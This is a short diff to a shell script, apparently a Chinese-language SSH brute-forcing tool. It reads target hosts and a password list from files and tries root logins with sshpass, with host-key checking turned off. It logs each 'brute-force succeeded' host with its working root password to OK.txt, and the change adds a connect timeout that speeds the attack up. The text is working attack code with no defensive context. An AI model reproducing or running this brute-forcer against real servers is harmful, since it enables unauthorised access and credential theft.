@@ -26,7 +26,7 @@ for i in `cat hosts`;do
 	echo "$i 爆破中！"
 	for j in `cat password`;do
 		{
-		sshpass -p "$j"	ssh root@$i -o StrictHostKeyChecking=no ':' &>/dev/null
+		sshpass -p "$j"	ssh root@$i -o StrictHostKeyChecking=no -o ConnectTimeout=2 ':' &>/dev/null
 		if [ $? -eq 0 ];then
 			echo "$i 爆破成功！"
 			echo -e "主机IP:$i\t用户:root,密码:$j" >>OK.txt
